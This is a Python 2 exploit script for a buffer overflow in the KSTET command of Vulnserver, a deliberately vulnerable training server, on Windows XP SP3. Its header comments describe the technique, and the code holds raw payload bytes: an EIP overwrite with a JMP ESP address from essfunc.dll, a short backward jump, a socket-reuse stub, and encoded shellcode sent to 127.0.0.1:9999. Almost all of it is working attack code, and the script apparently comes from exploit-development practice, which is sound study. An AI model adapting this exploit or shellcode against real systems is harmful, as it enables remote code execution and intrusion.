#!/usr/bin/python
# Title: Vulnserver KSTET command - socket reuse
# Target binary: vulnserver.exe
# Target system: Windows XP SP3

#-----------------------------------------------------------------------------------------------------------#
# --> overflowing the buffer:
# 1) reaching the instruction pointer after 70 bytes:
#       - adding 8 nops for padding;
#       - dropping the socket reuse shellcode;
#       - filling the remaining buffer space with junk bytes ("A") to reach the EIP;
# 2) overwriting the EIP with --> JMP ESP from essfunc.dll;
# 3) adding 4 nops for padding;
# 4) performing a 74-byte short jump backwards and landing into the buffer space (nops at the beginning)
# 5) execution of the socket reuse shellcode - waiting for user input - sending shellcode and executing it
#-----------------------------------------------------------------------------------------------------------#


import socket
import sys

shellcode = "\xbe\xbb\xb3\x12\xd4\xda\xd5\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
shellcode += "\x31\x83\xe8\xfc\x31\x70\x0f\x03\x70\xb4\x51\xe7\x28\x22\x17"
shellcode += "\x08\xd1\xb2\x78\x80\x34\x83\xb8\xf6\x3d\xb3\x08\x7c\x13\x3f"
shellcode += "\xe2\xd0\x80\xb4\x86\xfc\xa7\x7d\x2c\xdb\x86\x7e\x1d\x1f\x88"
shellcode += "\xfc\x5c\x4c\x6a\x3d\xaf\x81\x6b\x7a\xd2\x68\x39\xd3\x98\xdf"
shellcode += "\xae\x50\xd4\xe3\x45\x2a\xf8\x63\xb9\xfa\xfb\x42\x6c\x71\xa2"
shellcode += "\x44\x8e\x56\xde\xcc\x88\xbb\xdb\x87\x23\x0f\x97\x19\xe2\x5e"
shellcode += "\x58\xb5\xcb\x6f\xab\xc7\x0c\x57\x54\xb2\x64\xa4\xe9\xc5\xb2"
shellcode += "\xd7\x35\x43\x21\x7f\xbd\xf3\x8d\x7e\x12\x65\x45\x8c\xdf\xe1"
shellcode += "\x01\x90\xde\x26\x3a\xac\x6b\xc9\xed\x25\x2f\xee\x29\x6e\xeb"
shellcode += "\x8f\x68\xca\x5a\xaf\x6b\xb5\x03\x15\xe7\x5b\x57\x24\xaa\x31"
shellcode += "\xa6\xba\xd0\x77\xa8\xc4\xda\x27\xc1\xf5\x51\xa8\x96\x09\xb0"
shellcode += "\x8d\x69\x40\x99\xa7\xe1\x0d\x4b\xfa\x6f\xae\xa1\x38\x96\x2d"
shellcode += "\x40\xc0\x6d\x2d\x21\xc5\x2a\xe9\xd9\xb7\x23\x9c\xdd\x64\x43"
shellcode += "\xb5\xbd\xeb\xd7\x55\x6c\x8e\x5f\xff\x70"

reuse = "\x54\x58\x66\x05\x88\x01\x83\xEC\x64\x54\x5B\x66\x83\xC3\x50"
reuse += "\x33\xC9\x51\x80\xC5\x05\x51\x53\xFF\x30\xBA\x2D\x26\x41\x01"
reuse += "\x81\xEA\x01\x01\x01\x01\xFF\xD2"

payload = "\x90"*8
payload += reuse
payload += "\x90"*8
payload += "A"*(54-len(reuse))
payload += "\xaf\x11\x50\x62"    # 0x625011AF jmp esp (essfunc.dll);
payload += "\x90"*4
payload += "\xeb\xb6"
payload += "\x90\x90"


try:
    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    r.connect(('127.0.0.1', 9999))
    print r.recv(1024)
    r.send("KSTET " + payload)  # reusing the socket and waiting for user input;
    raw_input("Press enter to trigger...")
    r.send(shellcode)           # sending final shellcode to the socket;
    r.close()

except:
    print "[-] Connection error..."
    sys.close()
